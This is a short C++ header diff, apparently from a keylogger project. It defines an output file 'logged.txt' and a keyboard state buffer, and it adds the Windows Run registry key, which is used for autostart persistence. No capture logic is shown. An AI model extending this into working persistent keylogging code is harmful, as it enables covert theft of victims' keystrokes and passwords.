@@ -5,9 +5,11 @@
 #include <string>
 #include <unordered_map>
 
-namespace constants
+namespace configuration
 {
 	constexpr const wchar_t* out_file = L"logged.txt";
+
+	constexpr const wchar_t* lp_sub_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
 	constexpr uint16_t keyboard_state_size = 256;
 
